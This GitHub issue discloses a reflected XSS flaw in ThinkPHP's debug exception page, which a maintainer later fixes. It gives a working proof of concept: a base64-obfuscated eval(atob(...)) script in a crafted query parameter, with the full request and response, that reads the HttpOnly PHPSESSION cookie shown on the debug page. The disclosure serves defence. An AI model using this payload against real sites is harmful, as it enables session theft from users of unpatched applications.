
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftop-think%2Fframework%2Fissues%2F2996)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftop-think%2Fframework%2Fissues%2F2996)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=top-think%2Fframework)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[top-think](/top-think)
/
**[framework](/top-think/framework)**
Public

* [Notifications](/login?return_to=%2Ftop-think%2Fframework) You must be signed in to change notification settings
* [Fork
  1.1k](/login?return_to=%2Ftop-think%2Fframework)
* [Star
   2.7k](/login?return_to=%2Ftop-think%2Fframework)

* [Code](/top-think/framework)
* [Issues
  87](/top-think/framework/issues)
* [Pull requests
  23](/top-think/framework/pulls)
* [Discussions](/top-think/framework/discussions)
* [Actions](/top-think/framework/actions)
* [Security](/top-think/framework/security)
* [Insights](/top-think/framework/pulse)

Additional navigation options

* [Code](/top-think/framework)
* [Issues](/top-think/framework/issues)
* [Pull requests](/top-think/framework/pulls)
* [Discussions](/top-think/framework/discussions)
* [Actions](/top-think/framework/actions)
* [Security](/top-think/framework/security)
* [Insights](/top-think/framework/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Ftop-think%2Fframework%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Ftop-think%2Fframework%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Reflected XSS(Cross Site Scripting) #2996

Closed

[asdf1115qwer](/asdf1115qwer) opened this issue
Apr 8, 2024
· 1 comment
 · Fixed by [#3000](https://github.com/top-think/framework/pull/3000) or [#3001](https://github.com/top-think/framework/pull/3001)

Closed

# [Reflected XSS(Cross Site Scripting)](#top) #2996

[asdf1115qwer](/asdf1115qwer) opened this issue
Apr 8, 2024
· 1 comment
 · Fixed by [#3000](https://github.com/top-think/framework/pull/3000) or [#3001](https://github.com/top-think/framework/pull/3001)

Labels
[bug](/top-think/framework/labels/bug)

## Comments

[![@asdf1115qwer](https://avatars.githubusercontent.com/u/90684905?s=80&v=4)](/asdf1115qwer)

Copy link

### **[asdf1115qwer](/asdf1115qwer)** commented [Apr 8, 2024](#issue-2231814825) • edited Loading

| 所属功能组件 异常(Exception) ThinkPHP 版本 up to the latest version 操作系统 Debian 错误信息  * **Vulnerability description**   The following vulnerable code and PoC were utilised to obtain cookies with the HttpOnly option set, exposed in debug error message, through an XSS vulnerability.  **Vulnerable code:**  ``` <?php namespace app\index\controller;  use app\index\model\User;  class Index {     public function index(**array $params**)     {         setcookie("PHPSESSION", "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08", time()+3600, "/", "", 0);         echo "session " . session_id("PHPSESSION");     } } ```  **Affected version:** 5.0.9  ``` <script>eval(atob(`ZG9jdW1lbnQucmVhZHlTdGF0ZT09PSdsb2FkaW5nJz9kb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJyxmdW5jdGlvbigpe2RvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2Rpdi5jb2wtbWQtMycpLmZvckVhY2goZGl2PT57aWYoZGl2LnRleHRDb250ZW50LmluY2x1ZGVzKCdQSFBTRVNTSU9OJykpe2FsZXJ0KGRpdi5uZXh0RWxlbWVudFNpYmxpbmcudGV4dENvbnRlbnQudHJpbSgpKTt9fSk7fSk6ZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnZGl2LmNvbC1tZC0zJykuZm9yRWFjaChkaXY9PntpZihkaXYudGV4dENvbnRlbnQuaW5jbHVkZXMoJ1BIUFNFU1NJT04nKSl7YWxlcnQoZGl2Lm5leHRFbGVtZW50U2libGluZy50ZXh0Q29udGVudC50cmltKCkpO319KTsK`))</script>  ```  The following request, response and screenshot evidence successful execution of the JavaScript payload.  **Request:**  ``` GET /?%3Cscript%3Eeval(atob(`ZG9jdW1lbnQucmVhZHlTdGF0ZT09PSdsb2FkaW5nJz9kb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJyxmdW5jdGlvbigpe2RvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2Rpdi5jb2wtbWQtMycpLmZvckVhY2goZGl2PT57aWYoZGl2LnRleHRDb250ZW50LmluY2x1ZGVzKCdQSFBTRVNTSU9OJykpe2FsZXJ0KGRpdi5uZXh0RWxlbWVudFNpYmxpbmcudGV4dENvbnRlbnQudHJpbSgpKTt9fSk7fSk6ZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnZGl2LmNvbC1tZC0zJykuZm9yRWFjaChkaXY9PntpZihkaXYudGV4dENvbnRlbnQuaW5jbHVkZXMoJ1BIUFNFU1NJT04nKSl7YWxlcnQoZGl2Lm5leHRFbGVtZW50U2libGluZy50ZXh0Q29udGVudC50cmltKCkpO319KTsK`))%3C/script%3E=1 HTTP/1.1 Host: 127.0.0.1 Cache-Control: max-age=0 sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120" sec-ch-ua-mobile: ?0 sec-ch-ua-platform: "macOS" Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate, br Accept-Language: en-GB,en-US;q=0.9,en;q=0.8 Cookie: PHPSESSION=9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08 Connection: close  ```  **Response:**  ``` HTTP/1.1 500 Internal Server Error Date: Mon, 08 Apr 2024 17:03:49 GMT Server: Apache/2.4.25 (Debian) X-Powered-By: PHP/7.1.18 Connection: close Content-Type: text/html; charset=utf-8 Content-Length: 46206  <!DOCTYPE html> <html> <head>     <meta charset="UTF-8">   ... [ TRUNCATED ] ...    <body>     <div class="echo">             </div>         <div class="exception">     <div class="message">                      <div class="info">                 <div>                     <h2>[0] <abbr title="InvalidArgumentException">InvalidArgumentException</abbr> in <a class="toggle" title="/var/www/thinkphp/library/think/App.php line 281">App.php line 281</a></h2>                 </div>                 <div><h1>方法参数错误:params</h1></div>             </div>              </div> 	        <div class="source-code">             <pre class="prettyprint lang-php"><ol start="272"><li class="line-272"><code>                $result = method_exists($className, 'instance') ? $className::instance() : new $className; </code></li><li class="line-273"><code>            } </code></li><li class="line-274"><code>        } elseif (1 == $type &amp;&amp; !empty($vars)) { </code></li><li class="line-275"><code>            $result = array_shift($vars); </code></li><li class="line-276"><code>        } elseif (0 == $type &amp;&amp; isset($vars[$name])) { </code></li><li class="line-277"><code>            $result = $vars[$name]; </code></li><li class="line-278"><code>        } elseif ($param-&gt;isDefaultValueAvailable()) { </code></li><li class="line-279"><code>            $result = $param-&gt;getDefaultValue(); </code></li><li class="line-280"><code>        } else { </code></li><li class="line-281"><code>            throw new \InvalidArgumentException('method param miss:' . $name); </code></li><li class="line-282"><code>        } </code></li><li class="line-283"><code>        return $result; </code></li><li class="line-284"><code>    } </code></li><li class="line-285"><code> </code></li><li class="line-286"><code>    protected static function exec($dispatch, $config) </code></li><li class="line-287"><code>    { </code></li><li class="line-288"><code>        switch ($dispatch['type']) { </code></li><li class="line-289"><code>            case 'redirect': </code></li><li class="line-290"><code>                // 执行重定向跳转 </code></li></ol></pre>         </div> 	        <div class="trace">             <h2>Call Stack</h2>             <ol>                 <li>in <a class="toggle" title="/var/www/thinkphp/library/think/App.php line 281">App.php line 281</a></li>                                 <li>                 at <abbr title="think\App">App</abbr>::getParamValue(<em>object</em>(<abbr title="ReflectionParameter">ReflectionParameter</abbr>), ['**<script>eval(atob(`ZG9jdW1lbnQucmVhZHlTdGF0ZT09PSdsb2FkaW5nJz9kb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJyxmdW5jdGlvbigpe2RvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2Rpdi5jb2wtbWQtMycpLmZvckVhY2goZGl2PT57aWYoZGl2LnRleHRDb250ZW50LmluY2x1ZGVzKCdQSFBTRVNTSU9OJykpe2FsZXJ0KGRpdi5uZXh0RWxlbWVudFNpYmxpbmcudGV4dENvbnRlbnQudHJpbSgpKTt9fSk7fSk6ZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnZGl2LmNvbC1tZC0zJykuZm9yRWFjaChkaXY9PntpZihkaXYudGV4dENvbnRlbnQuaW5jbHVkZXMoJ1BIUFNFU1NJT04nKSl7YWxlcnQoZGl2Lm5leHRFbGVtZW50U2libGluZy50ZXh0Q29udGVudC50cmltKCkpO319KTsK`))</script>**' => '1'], 0) in <a class="toggle" title="/var/www/thinkphp/library/think/App.php line 242">App.php line 242</a>                </li>                                 <li>                 at <abbr title="think\App">App</abbr>::bindParams(<em>object</em>(<abbr title="ReflectionMethod">ReflectionMethod</abbr>), ['**<script>eval(atob(`ZG9jdW1lbnQucmVhZHlTdGF0ZT09PSdsb2FkaW5nJz9kb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJyxmdW5jdGlvbigpe2RvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2Rpdi5jb2wtbWQtMycpLmZvckVhY2goZGl2PT57aWYoZGl2LnRleHRDb250ZW50LmluY2x1ZGVzKCdQSFBTRVNTSU9OJykpe2FsZXJ0KGRpdi5uZXh0RWxlbWVudFNpYmxpbmcudGV4dENvbnRlbnQudHJpbSgpKTt9fSk7fSk6ZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnZGl2LmNvbC1tZC0zJykuZm9yRWFjaChkaXY9PntpZihkaXYudGV4dENvbnRlbnQuaW5jbHVkZXMoJ1BIUFNFU1NJT04nKSl7YWxlcnQoZGl2Lm5leHRFbGVtZW50U2libGluZy50ZXh0Q29udGVudC50cmltKCkpO319KTsK`))</script>**' => '1']) in <a class="toggle" title="/var/www/thinkphp/library/think/App.php line 193">App.php line 193</a>                </li>                                 <li>                 at <abbr title="think\App">App</abbr>::invokeMethod([<em>object</em>(<abbr title="app\index\controller\Index">Index</abbr>), 'index'], []) in <a class="toggle" title="/var/www/thinkphp/library/think/App.php line 408">App.php line 408</a>                </li>                                 <li>                                                                                                   ... [ TRUNCATED ] ... ```  **Screenshot [#1](https://github.com/top-think/framework/pull/1):**  [Screenshot_1](https://private-user-images.githubusercontent.com/90684905/320603977-01ff08d4-b896-4a46-ad16-bfcb7de7cf6f.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MjYzMzYsIm5iZiI6MTczNjYyNjAzNiwicGF0aCI6Ii85MDY4NDkwNS8zMjA2MDM5NzctMDFmZjA4ZDQtYjg5Ni00YTQ2LWFkMTYtYmZjYjdkZTdjZjZmLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDIwMDcxNlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTdjNzU0OTdkMzZhYzZjMTBjYTQyMmJjYTNiNGU3NjA4ZjAzMzQ4Zjc1Y2I2NGU3NjZmMDYyYzZhMTdhYzkxMTkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.WsapHXl2C4b5dN8oUQK0P4o5JEz29K30cTFKB8-Os-s)  It was observed that the debug error output source code (think\_exception.tpl) is vulnerable due to inadequate filtering of function argument values. This vulnerability may render the debug pages susceptible to the extraction of critical information, such as HTTP cookies and file information, through reflected XSS attacks. This vulnerability occurs under specific conditions, particularly when a web server accepts user input as an argument, resulting in the occurrence of errors.  **Code:** /tpl/think\_exception.tpl  **Affected Version:** v5.0.9  **Screenshot [#2](https://github.com/top-think/framework/pull/2):**  [image (1)](https://private-user-images.githubusercontent.com/90684905/320604703-88cc28d7-cd20-411f-8d91-c28cb820aafa.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MjYzMzYsIm5iZiI6MTczNjYyNjAzNiwicGF0aCI6Ii85MDY4NDkwNS8zMjA2MDQ3MDMtODhjYzI4ZDctY2QyMC00MTFmLThkOTEtYzI4Y2I4MjBhYWZhLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDIwMDcxNlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTFkYjhmMzgyMDdkZWY1NTYxOTJkNTI0MDlmZWYxZTVlM2RkMTI5YjQyZDZkMzE0YzViM2M3NTRiNjgxMjU5M2YmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.UpQ3RZPxZF0UHm9dvmUV55_KcAldA4fU-nWD2k0iesE)  **Code:** src/tpl/think\_exception.tpl  **Affected Version:** v8.0.3  **Screenshot [#3](https://github.com/top-think/framework/issues/3):** [screenshot3](https://private-user-images.githubusercontent.com/90684905/320605186-ed29e12a-ba8f-46a0-9d46-4ba28246c768.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MjYzMzYsIm5iZiI6MTczNjYyNjAzNiwicGF0aCI6Ii85MDY4NDkwNS8zMjA2MDUxODYtZWQyOWUxMmEtYmE4Zi00NmEwLTlkNDYtNGJhMjgyNDZjNzY4LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDIwMDcxNlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTQ5YWU4NWNhMTliNjMwYWUwOTliZTRmNzEwZDQxNzkxOTNiZmExYjg0Yjk3YjAyZjk2MDVhMGE2MmM4YmM5ZWImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.R3mRv6U6mDWTYdSqEwsiFPWx4IgUf6PlQkTbgNNDlCc)  * **Implication**   Cross-site scripting (XSS) vulnerabilities enable the execution of malicious JavaScript code that has been inserted by an attacker. This poses significant security risks as it allows for a range of attacks, including session hijacking, theft of sensitive information, internal port scanning, defacement, phishing, keylogging, and unauthorized actions on behalf of the victim.  One common method of exploiting reflected cross-site scripting vulnerabilities occurs when victims unwittingly click on a specially crafted URL containing embedded XSS payloads. These URLs can be disseminated through various channels such as instant messaging, emails, or comments on websites.  In this scenario, an attacker could craft an exploitable link to execute JavaScript code on the debug page. As a result, the debug pages become vulnerable to reflected XSS attacks, enabling the extraction of critical information such as HTTP cookies, file information, and more.   * **Remediation**   It is recommended to encode the affected values(args, class, function etc) to HTML Entity Encode. 其它说明 The discovery was made by Seryun (Seryeon) Ham from Bitdefender. If you have any questions or require further information, please leave a comment. Additionally, I have registered the finding on the CVE website. Please confirm whether it is possible to disclose this vulnerability via CVE website. |
| --- |
| The text was updated successfully, but these errors were encountered: |

 👍
1
 Guxinpei reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

[![@asdf1115qwer](https://avatars.githubusercontent.com/u/90684905?s=40&v=4)](/asdf1115qwer)
[asdf1115qwer](/asdf1115qwer)
added
the
[bug](/top-think/framework/labels/bug)
label
[Apr 8, 2024](#event-12396783630)

[![@asdf1115qwer](https://avatars.githubusercontent.com/u/90684905?s=40&v=4)](/asdf1115qwer)
[asdf1115qwer](/asdf1115qwer)
changed the title
~~Reflected XSS(Cross Site Scripting)~~
t
[Apr 8, 2024](#event-12396796159)

[![@asdf1115qwer](https://avatars.githubusercontent.com/u/90684905?s=40&v=4)](/asdf1115qwer)
[asdf1115qwer](/asdf1115qwer)
closed this as [completed](/top-think/framework/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Apr 8, 2024](#event-12396802290)

[![@asdf1115qwer](https://avatars.githubusercontent.com/u/90684905?s=40&v=4)](/asdf1115qwer)
[asdf1115qwer](/asdf1115qwer)
changed the title
~~t~~
Reflected XSS(Cross Site Scripting)
[Apr 8, 2024](#event-12396947268)

[![@asdf1115qwer](https://avatars.githubusercontent.com/u/90684905?s=40&v=4)](/asdf1115qwer)
[asdf1115qwer](/asdf1115qwer)
reopened this
[Apr 8, 2024](#event-12396956823)

[![@big-dream](https://avatars.githubusercontent.com/u/9215157?s=40&u=7d95e6eb595bd1249191dda0f30cda4b6c3994de&v=4)](/big-dream)
[big-dream](/big-dream)
mentioned this issue
[Apr 9, 2024](#ref-pullrequest-2232461867)

[修正 $key 未编码导致的异常页面 XSS 漏洞
#2997](/top-think/framework/pull/2997)
 Merged

This was
linked to
pull requests
Apr 16, 2024

[修正 $key 未编码导致的异常页面 XSS 漏洞(ThinkPHP 6.1)
#3000](/top-think/framework/pull/3000)
 Merged

[修正 $key 未编码导致的异常页面 XSS 漏洞(ThinkPHP 6.0)
#3001](/top-think/framework/pull/3001)
 Merged

[![@big-dream](https://avatars.githubusercontent.com/u/9215157?s=80&u=7d95e6eb595bd1249191dda0f30cda4b6c3994de&v=4)](/big-dream)

Copy link

Contributor

### **[big-dream](/big-dream)** commented [Apr 16, 2024](#issuecomment-2058108160)

| Thank you very much for your feedback. This issue has been fixed now.   ---   对于没有修复的旧版本，可以参考以下建议：   * 线上环境可以关闭调试模式 * 请勿随意打开他人发给您的链接 * 升级到安全的版本（8.0.4、6.1.5和6.0.17） * 无法升级版本的，可以参考 `PR` ，自行修改对应文件 |
| --- |

 👍
1
 F4NNIU reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@big-dream](https://avatars.githubusercontent.com/u/9215157?s=40&u=7d95e6eb595bd1249191dda0f30cda4b6c3994de&v=4)](/big-dream)
[big-dream](/big-dream)
closed this as [completed](/top-think/framework/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Apr 16, 2024](#event-12480576960)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Ftop-think%2Fframework%2Fissues%2F2996)

Assignees

No one assigned

Labels

[bug](/top-think/framework/labels/bug)

Projects

None yet

Milestone

No milestone

Development

Successfully merging a pull request may close this issue.

 [修正 $key 未编码导致的异常页面 XSS 漏洞(ThinkPHP 6.1)](/top-think/framework/pull/3000)
 [big-dream/framework](/big-dream/framework)

 [修正 $key 未编码导致的异常页面 XSS 漏洞(ThinkPHP 6.0)](/top-think/framework/pull/3001)
 [big-dream/framework](/big-dream/framework)

2 participants

[![@big-dream](https://avatars.githubusercontent.com/u/9215157?s=52&v=4)](/big-dream) [![@asdf1115qwer](https://avatars.githubusercontent.com/u/90684905?s=52&v=4)](/asdf1115qwer)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

